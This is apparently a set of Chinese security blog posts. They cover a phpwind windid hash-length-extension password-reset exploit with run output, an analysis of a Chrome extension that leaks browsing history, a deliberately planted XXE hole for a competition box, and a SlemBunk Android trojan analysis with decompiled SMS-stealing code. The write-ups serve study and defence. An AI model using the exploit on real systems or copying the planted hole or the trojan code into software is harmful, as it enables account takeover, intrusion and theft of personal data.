&quot;&quot;&quot;http%3A%2F%2F192.168.3.106%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D5%26windidkey%3D1eb5af71d002ac89e22c0170806b0fe8%26time%3D1466416702%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2F192.168.3.106%2Fwindid%2Fattachment%2F%2Favatar%2F000%2F00%2F00%2F5.jpg%3Fr%3D78057&quot;&quot;&quot; request = urlparse.urlparse(urllib.unquote(r)) querys = [item for item in request.query.split(&quot;&amp;&quot;)] query_dict = &#123;item.split(&quot;=&quot;)[0]:item.split(&quot;=&quot;)[1] for item in querys&#125; ori_md5 = query_dict.get(&quot;windidkey&quot;) time = query_dict.get(&apos;time&apos;) uid = query_dict.get(&apos;uid&apos;) ori_str = &quot;&#123;0&#125;adoAvatarcavatarmapitypeflashuid&#123;1&#125;uidundefined&quot;.format(time,uid) password = &quot;test123&quot; ip = &quot;192.168.3.173&quot; ip = &quot;192.168.3.106&quot; target_uid = 3 post_append= &quot;a=getConfig&amp;c=config&amp;m=api&amp;id=1&quot; post_append= &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid,password) post = &quot;&quot;.join(sorted([item.replace(&quot;=&quot;,&quot;&quot;) for item in post_append.split(&quot;&amp;&quot;)]))# security = &quot;d2edc0a3340df65cb66387464f3adfc1&quot;# ori_str = &quot;1465784719adoAvatarcavatarmapitypeflashuid2uidundefined&quot; security_len = 32#phpwind计算windidkey 公式md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str),md5值的长度是32 print &apos;hashmd5:&apos;,ori_md5 print &apos;security len:&apos;, security_len print &apos;ori_str&apos;, ori_str append = &apos;agetcappid1mapi&apos; append = &quot;namespacesite&quot; + post print &apos;post&apos;,append (md5,quoted_message) = md5hack(ori_md5, ori_str, append, security_len) padding = quoted_message[quoted_message.index(&quot;%&quot;):quoted_message.rindex(&quot;%&quot;)+3] modify_passwd(ip, uid, target_uid, md5, padding, time, password) 运行之后得到123456789101112root@kali:~/python# python md5hack.pyhashmd5: 4d8971d0d2556d5dcbeb3b0f10e41429security len: 32ori_str 1466474956adoAvatarcavatarmapitypeflashuid10uidundefinedpost namespacesiteaeditUsercusermapipasswordtangTest3uid3md5 after hash length attacked: e46e0aaddbd4e008077535a4dafab3f5message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined▒▒namespacesiteaeditUsercusermapipasswordtangTest3uid3quote message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00namespacesiteaeditUsercusermapipasswordtangTest3uid3url: http://192.168.3.173/windid/index.php?windidkey=e46e0aaddbd4e008077535a4dafab3f5&amp;adoAvatarcavatarmapitypeflashuid10uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00&amp;clientid=1&amp;time=1466474956&amp;namespace=sitedata: a=editUser&amp;c=user&amp;m=api&amp;uid=3&amp;password=test1231modify password Succeed 代码中修改uid为3的账户的密码为GongFang7，假设该用户具有后台管理员权限，进入后台getshell，具体的getshell可参考http://www.wooyun.org/bugs/wooyun-2016-0175518]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>hash length attack</tag>
        <tag>hashpump</tag>
        <tag>getshell</tag>
        <tag>哈希长度扩展攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小心浏览器插件窃取你的隐私]]></title>
    <url>%2F2016%2F05%2F01%2F%E5%B0%8F%E5%BF%83%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E7%AA%83%E5%8F%96%E4%BD%A0%E7%9A%84%E9%9A%90%E7%A7%81%2F</url>
    <content type="text"><![CDATA[浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。 #1 简单介绍：用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。原名:Gestures for Chrome(TM)汉化版.方便,快捷,充分发掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等.本扩展致力于通过鼠标来实现一些功能操作,充分挖掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等目前在google市场上这款插件有30万的用户，累计评价5000，其中很大一部分是国内用户，影响还是非常广泛的。 #2 验证窃取行为通过wireshark抓包可以看到两个分别发送到s808.searchelper.com和s1808.searchelper.com的请求，直接上图： 从origin可以看出，请求是来源于浏览器插件，标记为：jgiplclhploodgnkcljjgddajfbmafmp，可以通过chrome的chrome://extensions/找到该id对应的插件，就是，其对应的系统目录为 12C:\Users\[用户]\AppData\Local\Google\Chrome\User Data\Default\Extensions\jgiplclhploodgnkcljjgddajfbmafmp ```，我们可以通过分析其代码发现其实现，这个后续再讲。细心的读者可能会看到post请求段被加密了，看结构像是base64，尝试用base64解码，还是base64编码格式，再次解码，得到如下数据： s=808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=314039255259558500&amp;q=http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=301512s=808就代表着服务器s808,pid即userid，sess是用户本地标记session，sub代表着浏览器类型，q代表当前页面，prev代表着从哪个页面过来，也就是referer的作用，hreferer就也记录着referer字段有了这些数据就可以分析用户行为，可以供搜索引擎，其实百度统计和google统计也是干同样的事，甚至百度统计还有点击等的统计。就这样你的浏览行为被发送给了其他服务器，这不是最危险的，最危险的是你在浏览内网的一些页面也会被发送出去，内网的一些站点就很容易被泄露了。 接着我们看另外一个请求，这个请求是发送到s1808服务器上，具体请求如下：![s1808服务器的请求][4]，解密加密后的内容和发送到s808的请求基本一致，具体如下： s=1808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=765877789119258500&amp;sub=chrome&amp;q=http%3A//bbs.pediy.com/showthread.php%3Ft%3D179524&amp;hreferer=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;prev=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;tmv=4015&amp;tmf=112345678910111213141516171819这里就有点搞不太清楚发这样一个备份请求的原因了，难道仅仅是备份，有待思考，为了更好的弄清楚该插件还有没有其他危险行为，接下来我们分析插件的实现。#3 恶意插件实现插件的恶意行为集中在upalytics_ch.js代码中，安装后的初始化代码：```jsthis.initOnceAfterInstall = function() &#123; if (!utils.db.get(&quot;userid&quot;)) &#123; var id = utils.createUserID(); utils.db.set(&quot;userid&quot;, id) &#125; if (!utils.db.get(&quot;install_time&quot;)) &#123; var now = (new Date).getTime() / 1E3; utils.db.set(&quot;install_time&quot;, now) &#125; if (!utils.db_type.get(&quot;tmv&quot;)) &#123; var now = (new Date).getTime() / 1E3; utils.db_type.set(&quot;tmv&quot;, SIM_ModuleConstants._TMV); &#125;&#125;; 在初始化中生成userid，获取install_time，twv字段存放在本地localstorage中，接着会创建各种调用addListener接口来创建监听器，当tab页更新，替换，激活的时候就会调用相应的请求发送相应的函数，extension_onRequest则是发送到s808服务器，tabs_onUpdated,tabs_onActivated,tabs_onReplaced则是发送请求到s1808服务器，具体代码如下：12345678910this.start = function() &#123; try &#123; chrome.extension.onRequest.addListener(extension_onRequest); chrome.tabs.onUpdated.addListener(tabs_onUpdated); chrome.tabs.onActivated.addListener(tabs_onActivated); chrome.tabs.onReplaced.addListener(tabs_onReplaced) &#125; catch (e) &#123; log.SEVERE("8835", e) &#125;&#125; 下面我们简单分析下发送到s808.searchelper.com的related请求的代码，已简化，简化部分主要是去除一些google搜索的跳转，去除docType非html类型的，去除间隔时间很短的。 123456789101112131415161718192021222324252627function extension_onRequest(request, sender, sendResponse) &#123; var prev_state = tabs_states[tabId]; tabs_states[tabId] = change_status; if (res_prev_url == tab_url &amp;&amp; prev_state != change_status)&#123; log.ERROR("ERROR 8002 ??"); return &#125; if(res_prev_url == null || res_prev_url.length == 0) &#123; res_prev_url = last_prev; &#125; last_prev = tab_url; var data = "s=" + SIM_Config_BG.getSourceId() + "&amp;md=21&amp;pid=" + utils.db.get("userid") + "&amp;sess=" + SIM_Session.getSessionId() + "&amp;q=" + encodeURIComponent(tab_url) + "&amp;prev=" + encodeURIComponent(res_prev_url) + "&amp;link=" + (ref ? "1" : "0") + "&amp;sub=" + SIM_ModuleConstants.BROWSER + "&amp;hreferer=" + encodeURIComponent(ref); data = data + "&amp;tmv=" + SIM_ModuleConstants._TMV; data = SIM_Base64.encode(SIM_Base64.encode(data)); data = "e=" + data; var url = utils.db_type.get("server") + "/related"; utils.net.post(url, "json", data, function(result) &#123; log.INFO("Succeeded in posting data"); tabs_prevs[tabId] = tab_url &#125;, function(httpCode) &#123; log.INFO("Failed to retrieve content. (HTTP Code:" + httpCode.status + ")"); log.ERROR("ERROR 8004 ??"); tabs_prevs[tabId] = tab_url &#125;)&#125; 从上述代码中可以看出在关键的浏览器当前url和referer都进行了两次base64编码处理，可以逃过一些普通用户的眼睛，难道这种方式能够躲过google的一些自动审查，比较好奇。 #4 建议码农也不容易，辛辛苦苦写出来的程序不赚钱只能靠窃取用户浏览历史发给第三方来获取回报，想必也是迫不得已，当然对于这种窃取隐私的绝对要抵制。mouse guesture作为一个很好用的特性，笔者已经难以离开，所以在google市场上选择了其他的guesture插件。有了这个教训，相信大家以后使用浏览器插件肯定会多长一双眼睛。]]></content>
      <categories>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>crxMouse Gesture</tag>
        <tag>手势插件</tag>
        <tag>隐私</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于mezzanine的攻防比赛环境搭建及XXE漏洞构造]]></title>
    <url>%2F2016%2F04%2F01%2F%E5%9F%BA%E4%BA%8Emezzanine%E7%9A%84%E6%94%BB%E9%98%B2%E6%AF%94%E8%B5%9B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8AXXE%E6%BC%8F%E6%B4%9E%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[虚拟部署virtualenv是python环境配置和切换工具，进入该虚拟环境后，pip安装的软件不影响当前主环境，这样就能很好的安装几个python版本了，解决了库之间的依赖关系。安装virtualenv和pipsudo apt-get install python-virtualenv python-pip 创建虚拟部署环境12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758gongfangbisai@ubuntu:~$virtualenv -p /usr//bin/python2.7 appgongfangbisai@ubuntu:~$ cd app/gongfangbisai@ubuntu:~/app$ lsbin include lib localgongfangbisai@ubuntu:~/app$ source bin/activate(app)gongfangbisai@ubuntu:~/app$ pip install mezzanineDownloading/unpacking mezzanine Downloading Mezzanine-3.1.10-py2.py3-none-any.whl (5.7MB): 5.7MB downloadedDownloading/unpacking bleach&gt;=1.4 (from mezzanine) Downloading bleach-1.4.1.tar.gz``` 首先使用virtualenv创建一个虚拟节点app，然后使用source激活，再在激活的节点下pip安装mezzanine，安装完mezzanine之后使用mezzanine-project来创建一个工程。 ```bash(app)gongfangbisai@ubuntu:~/app$ mezzanine-project myproject(app)gongfangbisai@ubuntu:~/app$ cd myproject/(app)gongfangbisai@ubuntu:~/app/myproject$ lsdeploy fabfile.py __init__.py local_settings.py manage.py requirements.txt settings.py urls.py wsgi.py(app)gongfangbisai@ubuntu:~/app/myproject$ python manage.py createdbCreating tables ...Creating table auth_permissionCreating table auth_group_permissionsCreating table auth_group..........You just installed Django's auth system, which means you don't have any superusers defined.Would you like to create one now? (yes/no): yesUsername (leave blank to use 'gongfangbisai'): gongfangbisaiEmail address: shengqi158@gmail.comPassword:Password (again):Superuser created successfully.A site record is required.Please enter the domain and optional port in the format 'domain:port'.For example 'localhost:8000' or 'www.example.com'.Hit enter to use the default (127.0.0.1:8000):Creating default site record: 127.0.0.1:8000 ...Installed 2 object(s) from 1 fixture(s)Would you like to install some initial demo pages?Eg: About us, Contact form, Gallery. (yes/no): yesCreating demo pages: About us, Contact form, Gallery ...Installed 16 object(s) from 3 fixture(s)Installing custom SQL ...Installing indexes ...Installed 0 object(s) from 0 fixture(s)(app)gongfangbisai@ubuntu:~/app/myproject$ lsdeploy fabfile.py __init__.pyc local_settings.pyc requirements.txt settings.pyc urls.pydev.db __init__.py local_settings.py manage.py settings.py static wsgi.py``` 使用mezzanine-project myproject创建完工程之后就是创建数据库，使用命令python manage.py createdb 即可，由于mezzanine是基于django框架的，可以看到一些基于django的数据库的创建。再接着会提示输入超级管理用户的用户名，email，密码，请记住，这是mezzanine系统的超级管理员。接下来我们试运行一下： ```bash(app)gongfangbisai@ubuntu:~/app/myproject$ python manage.py runserver 0.0.0.0:8000 再接着在浏览器访问127.0.0.1：8000，如果正常说明mezzanine的搭建第一步ok。 采用uwsgi + nginx 方案部署前期准备首先是安装nginx，uwsgi，再接着集中模板和静态文件，这样好配置静态路径1234python manager.py collectstaticpython manager.py collecttemplatessudo apt-get install nginxsudo apt-get install uwsgi 请求的发送过程大概如下,如果在最后的测试中报错的话就得按照数据的走向来排查问题：--> nginx --> uwsgi --> mezzanine(django)```12345### nginx 配置安装好nginx之后，/etc/init.d/nginx start 即可以启动nginx，在页面访问80端口就能查看到nginx的欢迎页面。重要是配置：nginx的默认配置文件路径：/etc/nginx/在/etc/nginx/sites-enabled 新建自己的配置文件，从sites-available拷贝一个default重命名为mysite_nginx.conf,编辑如下： server { listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /home/gongfangbisai/app/myproject/; #网站的root目录 index index.html index.htm; # Make site accessible from http://localhost/ server_name localhost; location /static { #静态配置文件 autoindex on; alias /home/gongfangbisai/app/myproject/static; access_log off; log_not_found off; } location / { #非静态请求，通过本地的8630端口来通信，这就是uwsgi后续要启动的端口 # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules uwsgi_pass 127.0.0.1:8630; include /home/gongfangbisai/app/myproject/uwsgi_params; } 12345678910111213141516修改完之后，可通过nginx -t 来测试配置文件是否有语法错误，确认ok之后即可启动。### uwsg 配置wsgi.py的内容具体如下：```pythonfrom __future__ import unicode_literalsimport osPROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))settings_module = &quot;%s.settings&quot; % PROJECT_ROOT.split(os.sep)[-1]os.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, settings_module)from django.core.wsgi import get_wsgi_applicationapplication = get_wsgi_application() 下面是配置wsgi：在网站根目录新建wsgi.xml，具体如下：(app)gongfangbisai@ubuntu:~/app/myproject$ cat wsgi.xml1234567891011&lt;uwsgi&gt; &lt;socket&gt;127.0.0.1:8630&lt;/socket&gt; &lt;master&gt;true&lt;/master&gt; &lt;chdir&gt;/home/gongfangbisai/app/myproject/&lt;/chdir&gt; &lt;pythonpath&gt;..&lt;/pythonpath&gt; &lt;module&gt;wsgi&lt;/module&gt; &lt;wsgi-file&gt;wsgi.py&lt;/wsgi-file&gt; &lt;enable-threads&gt;true&lt;/enable-threads&gt;&gt; &lt;processes&gt;4&lt;/processes&gt;&gt; &lt;plugin&gt;python&lt;/plugin&gt;&lt;/uwsgi&gt; socket 是和nginx通信接口，pythonpath 为..，这样才能包含djaong的setting，chdir为网站根目录。1(app)gongfangbisai@ubuntu:~/app/myproject$ uwsgi -x wsgi.xml， 启动起来之后访问首页ok，但是到一些具体的功能页的时候就报404，查看输出日志，uwsgi出现404的时候没动，nginx有日志，也就是说请求到了nginx就没发到uwsgi了，按道理应该是nginx的配置有问题，就查nginx的日志实在找不出问题，而且关键是想不到搜索的关键字，总报404于是就将nginx的配置文件的try_files $uri $uri/ =404;注释掉，这回uwsgi有输出了，显示如下：– unavailable modifier requested: 0 –搜索该关键字，很多人遇到这个问题，好吧，再把相应的库给装上吧 apt-get install uwsgi-plugin-python```123456装上库之后再sudo uwsgi -x wsgi.xml总报：```bashImportError: No module named mezzanineunable to load app 0 (mountpoint=&apos;&apos;) (callable not found or import error) 找了一下，说是python的路径问题，直接在该环境下python，再找sys.path没问题，后来再一看是自己手贱多加了个sudo，导致python环境不对，去掉sudo 运行uwsgi OK。 XXE漏洞的构造前期调研未做好，装了ubuntu13.04，装它的原因就是因为他最近没有报本地提权漏洞，有点因小失大。好吧，总不能从头安装mezzine吧，于是拿libxml下手，选用的python的lxml作为问题程序，其etree.so依赖libxml2和libxslt.于是安装存在xxe漏洞的libxml和libxlst，低于2.9.0，到http://xmlsoft.org/sources/ 下载相应的软件包，这里libxml选择2.8，libxlst选择1.2.27123gongfangbisai@ubuntu:~$ tar -zxvf libxslt-1.1.27.tar.gzgongfangbisai@ubuntu:~$ cd libxslt-1.1.27/gongfangbisai@ubuntu:~/libxslt-1.1.27$ ./configure&amp;make 最后make install 它会装在/usr/local/lib目录下 123456789101112131415161718192021222324gongfangbisai@ubuntu:~/libxslt-1.1.27$ pythonPython 2.7.6 (default, Jun 22 2015, 17:58:13)[GCC 4.8.2] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from lxml import etreeTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ImportError: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/python2.7/dist-packages/lxml/etree.so)&gt;&gt;&gt;gongfangbisai@ubuntu:~/libxslt-1.1.27$ ldd /usr/lib/python2.7/dist-packages/lxml/etree.so/usr/lib/python2.7/dist-packages/lxml/etree.so: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/python2.7/dist-packages/lxml/etree.so)/usr/lib/python2.7/dist-packages/lxml/etree.so: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/x86_64-linux-gnu/libxslt.so.1) linux-vdso.so.1 =&gt; (0x00007fffb9cc6000) libxslt.so.1 =&gt; /usr/lib/x86_64-linux-gnu/libxslt.so.1 (0x00007fca6d652000) libexslt.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libexslt.so.0 (0x00007fca6d43d000) libxml2.so.2 =&gt; /usr/lib/x86_64-linux-gnu/libxml2.so.2 (0x00007fca6d0df000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fca6cec1000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fca6cafc000) libgcrypt.so.11 =&gt; /lib/x86_64-linux-gnu/libgcrypt.so.11 (0x00007fca6c87d000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fca6c679000) libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007fca6c460000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fca6c159000) /lib64/ld-linux-x86-64.so.2 (0x00007fca6dc02000) libgpg-error.so.0 =&gt; /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007fca6bf55000) 安装完这两个软件后，通过strace python test.py &gt; test.log 2&gt;&amp;1发现其还是依赖原先libxml，第一步想到的是update-alternatives,12gongfangbisai@ubuntu:~/app/myproject/static/media/uploads$ update-alternatives --list libxmlupdate-alternatives: error: no alternatives for libxml 怎么都不提示有两个版本的的libxml，那怎么办呢，强制修改软链接：1234gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo ln -s /usr/local/lib/libxslt.so.1.1.27 libxslt.sogongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo rm libxslt.so.1gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo ln -s /usr/local/lib/libxslt.so.1.1.27 libxslt.so.1gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ ldconfig 这样libxslt.so的依赖关系搞定了，通过同样的方式搞定libxml2，搞定这两个库之后，还是会提示etree.so依赖2.9的接口，怎么办呢，直接pip install -v lxml==3.0 这个xml版本就不存在依赖2.9接口的问题。在这里也引入了后面会遇到的一个问题，xx测试在python命令行中没有问题，但是在django环境中就有问题，总报库的依赖有问题，猛一回头发现是python虚拟环境搞得鬼，这个虚拟环境会引入libxml和libxslt这种系统lib下的库，但是像python的环境就不会引入，比如/usr/local/lib/python2.7/site-packages/下的，没办法只能在虚拟环境下重新安装了一遍lxml，这样就不会有库依赖的问题了。 gongfangbisai@ubuntu:~/app/myproject/static/media/uploads$ xmllint –noent a.xml //命令行测试比python更容易跟踪 解决了依赖问题，下面就是编码问题了：django的登录认证：./django/contrib/auth/views.py 在这里去掉修改密码的功能，注释掉password_change函数 去掉重置密码链接：直接注释用注释url链接编辑grappelli_safe/templates/registration/ 相关页面 修改上传页面的逻辑处理，对于xml加上对entity的解释功能，这样就能导入一个xxe漏洞，修改filebrowser_safe/views.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051def decode_string(target): try: result = target.decode('utf8').encode('utf8') return (1,result) except: pass try: result = target.decode('gbk').encode('utf8') return (2,result) except: pass try: result = target.decode('gb2312').encode('utf8') return (3,result) except: pass try: result = target.decode('utf16').encode('utf8') return (4,result) except: pass try: result = target.decode('latin1').encode('utf8') return (5,result) except: pass return ''def _upload_file(request): for line in filedata.chunks(): code_type, line = decode_string(line) if code_type != 4 and 'ENTITY' in line: msg = _('illegal xml, ENTITY found!!!!') return HttpResponse(msg) uploadedfile = default_storage.save(file_path, filedata) if default_storage.exists(file_path) and file_path != uploadedfile: default_storage.move(smart_text(uploadedfile), smart_text(file_path), allow_overwrite=True) if file_path.lower().endswith(".xml"): from lxml import etree try: msg = _('path:%s:%s:%s:%s' %(uploadedfile, file_path,directory,type(filedata.chunks()))) if default_storage.exists(file_path): abs_path = smart_text(django_settings.MEDIA_ROOT + "/" + file_path) tree = etree.parse(abs_path) tree.write(abs_path)# return HttpResponse(msg) except Exception,e: msg = _('IOERROR:%s' %(e)) return HttpResponse(msg)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>攻防比赛</tag>
        <tag>xxe</tag>
        <tag>mezzanine</tag>
        <tag>virtualenv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SlemBunk木马浅析]]></title>
    <url>%2F2016%2F04%2F01%2FSlemBunk%E6%9C%A8%E9%A9%AC%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。 #1 恶意行为 ##1.1 控制锁屏行为控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。12345public void onCreate() &#123; super.onCreate(); this.mWakeLock = this. getSystemService("power" ).newWakeLock (1, "MyWakeLock" ); // in PARTIAL_WAKE_LOCK mode regardless of the power off this.mWakeLock .acquire (); &#125; ##1.2 设备管理员权限获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public void checkDeviceAdmin() &#123; ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class ); if(!this .deviceManager. isAdminActive(v0)) &#123; Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" ); v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0)); v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access"); this.startActivity (v1 ); &#125; &#125;``` ##1.3 隐藏图标等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。```javaif(("3". equals("3")) || ( "3" .equals( "1" ))) &#123; this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main . class), 2 , 1);``` ##1.4 计划任务```javaprivate void scheduleLaunch() &#123; Calendar v0 = Calendar .getInstance (); v0. add( 12, this .restartTimeMinutes); Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" ); v1. putExtra("values" , this. getIntent().getStringExtra ("values")); this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0)); &#125;``` ##1.5获取运行的应用slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面```java private String getTopRunning() &#123; List v1 = this .getSystemService ("activity"). getRunningTasks(1 ); String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ; return v3; &#125;``` ##1.6 获取短信记录```javapublic static String readMessagesFromDeviceDB (Context context) &#123; Cursor v8; Uri v1 = Uri .parse ("content://sms/inbox"); String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;; JSONArray v12 = new JSONArray(); try &#123; v8 = context.getContentResolver ().query (v1 , v2 , null, null, null ); if(v8 != null ) &#123; if(!v8.moveToFirst ()) &#123; goto label_55 ; &#125; do &#123; String v6 = v8.getString(v8.getColumnIndex ("address")); String v7 = v8.getString(v8.getColumnIndex ("body")); String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date( Long.parseLong(v8.getString(v8.getColumnIndex ("date"))))); JSONObject v13 = new JSONObject(); v13. put( "from", v6); v13. put( "body", v7); v13. put( "date", v9); v12. put( v13); if(v8.moveToNext ()) &#123; continue; &#125; break; &#125; while(true ); &#125; &#125; ##1.6获取电话号码12345678910111213141516171819202122232425262728293031323334public static String getPhoneNumber(Context context ) &#123; String v0 = context.getSystemService ("phone"). getLine1Number(); if(v0 == null || (v0. equals("" ))) &#123; v0 = ""; &#125; return v0; &#125;``` ##1.7 获取DeviceID```java public static String getDeviceId (Context context) &#123; String v1; String v0 = context.getSystemService ("phone"). getDeviceId(); if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123; v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" ); if(v0 != null &amp;&amp; !v0. equals("" )) &#123; return v0; &#125; v0 = Build.SERIAL ; if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123; return v0; &#125; v1 = "not available"; &#125; else &#123; v1 = v0; &#125; return v1; &#125; ##1.8 设置开机启动木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。12345678910&lt;receiver android:enabled="true " android:exported=" true" android:name=".reiujdksmcoiwerj "&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;receiver android:enabled="true " android:exported=" true" android:name=".hujnkij8uijkjlmj "&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.BOOT_COMPLETED " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; ##1.9 监听短信木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt; receiver android:enabled ="true" android:exported="true " android:name=".riejkmdcwepoksmieru "&gt; &lt;intent-filter android:priority="999 "&gt; &lt;action android:name="android.provider.Telephony.SMS_RECEIVED " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt;``` 下面是recevier的onReceive方法：```java public void onReceive(Context context, Intent intent ) &#123; SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0); new HashSet (); try &#123; Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize( new HashSet ()))); &#125; catch(Exception v2 ) &#123; v2. printStackTrace(); &#125; Map v3 = SendSMSRecevier .retrieveMessages (intent ); Iterator v10 = v3.keySet().iterator (); while(v10.hasNext()) &#123; Object v7 = v10.next(); CommandCenter v6 = new CommandCenter( v3. get( v7), "", context); if(v6.processCommand ()) &#123; this.abortBroadcast (); continue; &#125; boolean v4 = v6.needToInterceptIncoming (); boolean v5 = v6.needToListen (); if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123; if(!v5) &#123; continue; &#125; SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7)); continue; &#125; SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7)); this.abortBroadcast (); &#125; &#125;``` #2 木马工作流程木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：![][1]在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下： POST / HTTP/1.1Content-Length: 481Content-Type: text/plain; 